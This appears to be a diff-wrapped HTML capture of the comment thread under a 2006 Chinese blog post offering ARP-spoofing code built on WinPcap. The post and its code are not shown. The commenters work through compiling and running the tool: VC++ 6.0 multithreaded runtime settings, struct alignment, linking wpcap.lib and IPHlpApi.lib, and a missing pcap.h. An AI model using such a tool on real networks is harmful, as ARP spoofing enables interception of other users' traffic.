+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#6746">#</a>&nbsp;<a name="6746"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2006-05-08 15:06
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl03_NameLink" href="http://www.cppblog.com/saga/" target="_top">saga.constantine</a>
+					</div>
+					<div class="postText">
+						@龚超雄
+<br>你是说你下载的那个代码不能编译连接还是我的下载包里的exe不能在你的系统上运行啊??
+<br>&nbsp;&nbsp;<a onclick='return SetReplyAuhor("saga.constantine")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=saga.constantine" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl03_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl03$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl03_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#6749">#</a>&nbsp;<a name="6749"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2006-05-08 15:26
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl04_NameLink" href="http://www.cppblog.com/saga/" target="_top">saga.constantine</a>
+					</div>
+					<div class="postText">
+						@龚超雄
+<br>我刚刚在xp sp2下运行了arpsproof.exe 正常啊
+<br>&nbsp;&nbsp;<a onclick='return SetReplyAuhor("saga.constantine")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=saga.constantine" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl04_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl04$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl04_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#6751">#</a>&nbsp;<a name="6751"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2006-05-08 15:49
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl05_NameLink" target="_blank">龚超雄</a>
+					</div>
+					<div class="postText">
+						你的那个.exe可以运行，那个代码也可以编译执行但是执行后只显示发送成功但是没有返回结果！没有<b style="color: black; background-color: rgb(160, 255, 255);">扫描</b>网络内的计算机啊！&nbsp;&nbsp;<a onclick='return SetReplyAuhor("龚超雄")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e9%be%9a%e8%b6%85%e9%9b%84" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl05_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl05$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl05_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#6752">#</a>&nbsp;<a name="6752"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2006-05-08 15:55
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl06_NameLink" target="_blank">龚超雄</a>
+					</div>
+					<div class="postText">
+						就是到了Packetsend succeed就没有了！你的那个exe文件可以得到预期的结构！不知道是什么原因！是不是要开启ip路由功能啊！或者windows xp sp2要安装基于NDIS的网络协议驱动什么的啊！&nbsp;&nbsp;<a onclick='return SetReplyAuhor("龚超雄")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e9%be%9a%e8%b6%85%e9%9b%84" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl06_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl06$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl06_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#6756">#</a>&nbsp;<a name="6756"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2006-05-08 16:23
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl07_NameLink" target="_blank">龚超雄</a>
+					</div>
+					<div class="postText">
+						不知道是什么原因啊！很郁闷！&nbsp;&nbsp;<a onclick='return SetReplyAuhor("龚超雄")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e9%be%9a%e8%b6%85%e9%9b%84" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl07_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl07$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl07_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#6758">#</a>&nbsp;<a name="6758"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2006-05-08 16:50
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl08_NameLink" target="_blank">夜狼</a>
+					</div>
+					<div class="postText">
+						你的代码什么编译不了啊，是不是还要进行配置？我已经加有iphlpapi.h和iphlpapi.lib了。但是还是编译不了，出现这样的错误c:\documents and settings\dj\sheji9.cpp(135) : error C2065: '_beginthreadex' : undeclared identifier
+<br>Error executing cl.exe.
+<br>为什么呀？？？？
+<br>郁闷了！！&nbsp;&nbsp;<a onclick='return SetReplyAuhor("夜狼")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e5%a4%9c%e7%8b%bc" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl08_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl08$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl08_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#6759">#</a>&nbsp;<a name="6759"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2006-05-08 16:50
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl09_NameLink" href="http://www.cppblog.com/saga/" target="_top">saga.constantine</a>
+					</div>
+					<div class="postText">
+						@龚超雄
+<br>你是说exe能正常运行,并执行!!而你编译出来的程序无法执行!!是吗??
+<br>那大概是你的编译有问题吧??&nbsp;&nbsp;<a onclick='return SetReplyAuhor("saga.constantine")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=saga.constantine" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl09_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl09$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl09_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#6761">#</a>&nbsp;<a name="6761"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2006-05-08 16:52
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl10_NameLink" href="http://www.cppblog.com/saga/" target="_top">saga.constantine</a>
+					</div>
+					<div class="postText">
+						那是因为你的编译选项里面要选多线程的run-time lib&nbsp;&nbsp;<a onclick='return SetReplyAuhor("saga.constantine")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=saga.constantine" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl10_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl10$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl10_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#6762">#</a>&nbsp;<a name="6762"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2006-05-08 16:53
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl11_NameLink" target="_blank">夜狼</a>
+					</div>
+					<div class="postText">
+						是的！
+<br>.exe可以运行，可是代码没能编译成功！！&nbsp;&nbsp;<a onclick='return SetReplyAuhor("夜狼")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e5%a4%9c%e7%8b%bc" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl11_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl11$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl11_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#6764">#</a>&nbsp;<a name="6764"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2006-05-08 16:55
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl12_NameLink" href="http://www.cppblog.com/saga/" target="_top">saga.constantine</a>
+					</div>
+					<div class="postText">
+						@夜狼
+<br>编译设置是必须的!!不太难,知道了就不难,error C2065: '_beginthreadex' : undeclared identifier 
+<br>Error executing cl.exe. 就是你的run-time lib  库没有选好
+<br>另外还需要wpcap.lib你有加吗??&nbsp;&nbsp;<a onclick='return SetReplyAuhor("saga.constantine")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=saga.constantine" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl12_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl12$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl12_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#6765">#</a>&nbsp;<a name="6765"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2006-05-08 16:55
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl13_NameLink" target="_blank">夜狼</a>
+					</div>
+					<div class="postText">
+						run-time lib  这东西能给我一份吗？谢谢了大侠！！&nbsp;&nbsp;<a onclick='return SetReplyAuhor("夜狼")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e5%a4%9c%e7%8b%bc" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl13_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl13$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl13_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#6766">#</a>&nbsp;<a name="6766"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2006-05-08 16:59
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl14_NameLink" target="_blank">龚超雄</a>
+					</div>
+					<div class="postText">
+						那我是那里出问题了!反正就是运行了也没有结果!不能<b style="color: black; background-color: rgb(160, 255, 255);">扫描</b>啊!&nbsp;&nbsp;<a onclick='return SetReplyAuhor("龚超雄")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e9%be%9a%e8%b6%85%e9%9b%84" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl14_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl14$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl14_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#6767">#</a>&nbsp;<a name="6767"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2006-05-08 17:00
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl15_NameLink" target="_blank">夜狼</a>
+					</div>
+					<div class="postText">
+						那需要加什么编译配置这么多？你能说详细点吗？&nbsp;&nbsp;<a onclick='return SetReplyAuhor("夜狼")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e5%a4%9c%e7%8b%bc" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl15_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl15$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl15_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#6768">#</a>&nbsp;<a name="6768"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2006-05-08 17:03
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl16_NameLink" href="http://www.cppblog.com/saga/" target="_top">saga.constantine</a>
+					</div>
+					<div class="postText">
+						@夜狼
+<br>这是你的v6.0里面的设置,你选工程-&gt;设置-&gt;c/c++在调到code generation
+<br>就会看到run-time lib 设置
+<br>我的代码里面有用到多线程,所以你要选Multithreaded的 有两个 看你是生成debug版的exe还是release的exe&nbsp;&nbsp;<a onclick='return SetReplyAuhor("saga.constantine")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=saga.constantine" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl16_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl16$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl16_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#6770">#</a>&nbsp;<a name="6770"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2006-05-08 17:28
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl17_NameLink" href="http://www.cppblog.com/saga/" target="_top">saga.constantine</a>
+					</div>
+					<div class="postText">
+						@夜狼
+<br>去winpcap的官方网下开发包!!&nbsp;&nbsp;<a onclick='return SetReplyAuhor("saga.constantine")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=saga.constantine" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl17_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl17$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl17_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: 环境设置" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#6921">#</a>&nbsp;<a name="6921"></a>环境设置
+						<span>
+								2006-05-11 10:37
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl18_NameLink" target="_blank">龚超雄</a>
+					</div>
+					<div class="postText">
+						在windows xp sp2下面也可以很好地运行,就是要把vc++ 6.0设置好点,
+<br>building-setting-c/c++-category-codegeneration
+<br>下面的use runtime library改为debug multithreaded
+<br>下面的struct member aligment 改为2 bytes就可以了
+<br>在link里面加上wpcap.lib IPHlpApi.lib ws2_32.lib三个文件
+<br>就可以了!&nbsp;&nbsp;<a onclick='return SetReplyAuhor("龚超雄")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e9%be%9a%e8%b6%85%e9%9b%84" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl18_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl18$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl18_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#6925">#</a>&nbsp;<a name="6925"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2006-05-11 11:25
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl19_NameLink" target="_blank">夜狼</a>
+					</div>
+					<div class="postText">
+						XP下这样配置，运行成功！！顶上了！！
+<br>&nbsp;&nbsp;<a onclick='return SetReplyAuhor("夜狼")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e5%a4%9c%e7%8b%bc" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl19_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl19$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl19_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#6929">#</a>&nbsp;<a name="6929"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2006-05-11 11:45
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl20_NameLink" href="http://www.cppblog.com/saga/" target="_top">saga.constantine</a>
+					</div>
+					<div class="postText">
+						use runtime library改为debug multithreaded生成的是debug版
+<br>release版就用multithreaded
+<br>IPHlpApi.lib在sdk里面 wpcap.lib上官网下开发包&nbsp;&nbsp;<a onclick='return SetReplyAuhor("saga.constantine")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=saga.constantine" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl20_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl20$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl20_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#7939">#</a>&nbsp;<a name="7939"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2006-05-31 15:48
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl21_NameLink" href="http://qq%20153877784/" target="_top">文锋</a>
+					</div>
+					<div class="postText">
+						大哥  你的QQ号是好多？  电话号码也行  我的毕业设计刚好需要你这部分代码   我编译的时候刚开始说没有IPHlpApi.h  下了以后在IPHlpApi.h里又有个头文件里面有很多错误  你用的是vc++ 6.0吗？  怎么看你的工程象在5.0下创的呢？   是不是版本冲突？  希望能和你详谈一下  小弟现在真的急用  可以的话RMB买你的程序&nbsp;&nbsp;<a onclick='return SetReplyAuhor("文锋")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e6%96%87%e9%94%8b" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl21_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl21$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl21_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#7942">#</a>&nbsp;<a name="7942"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2006-05-31 16:13
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl22_NameLink" href="http://www.cppblog.com/saga/" target="_top">saga.constantine</a>
+					</div>
+					<div class="postText">
+						@文锋
+<br>我的QQ不是写在公告了里面吗？？？你可以看到的啊！！
+<br>&nbsp;&nbsp;<a onclick='return SetReplyAuhor("saga.constantine")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=saga.constantine" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl22_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl22$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl22_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#9061">#</a>&nbsp;<a name="9061"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2006-06-27 10:28
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl23_NameLink" target="_blank">王飞</a>
+					</div>
+					<div class="postText">
+						编译你的程序的时候出现下面的错误怎么处理?
+<br>fatal error C1083: Cannot open include file: 'pcap.h': No such file or directory.
+<br>为什么回找不到文件呢?wpcap3.1的下载包里面没有什么文件.VC++6.0添加Iinclude 时找不到指定的'pcap.h'.&nbsp;&nbsp;<a onclick='return SetReplyAuhor("王飞")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e7%8e%8b%e9%a3%9e" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl23_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl23$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl23_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#9062">#</a>&nbsp;<a name="9062"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2006-06-27 10:30
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl24_NameLink" target="_blank">王飞</a>
+					</div>
+					<div class="postText">
+						急用!!请大大尽快解答&nbsp;&nbsp;<a onclick='return SetReplyAuhor("王飞")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e7%8e%8b%e9%a3%9e" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl24_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl24$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl24_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#9825">#</a>&nbsp;<a name="9825"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2006-07-13 23:55
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl25_NameLink" href="http://www.cppblog.com/saga/" target="_top">saga.constantine</a>
+					</div>
+					<div class="postText">
+						@王飞
+<br>我有事好久没上网了，不好意思，现在问题解决了吗？
+<br>&nbsp;&nbsp;<a onclick='return SetReplyAuhor("saga.constantine")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=saga.constantine" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl25_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl25$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl25_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
